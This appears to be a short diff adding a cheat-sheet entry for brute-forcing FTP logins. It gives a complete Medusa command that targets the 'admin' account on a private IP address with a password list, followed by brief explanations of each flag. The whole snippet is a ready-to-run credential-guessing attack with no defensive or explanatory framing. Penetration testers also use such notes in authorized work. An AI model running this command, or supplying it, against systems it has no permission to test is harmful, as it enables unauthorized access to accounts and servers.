@@ -1,0 +1,10 @@
+🔐 Brute-force FTP:
+medusa -h 192.168.1.105 -u admin -P passwords.txt -M ftp
+-h: Target host
+
+-u: Username
+
+-P: Password list
+
+-M: Module/protocol
+
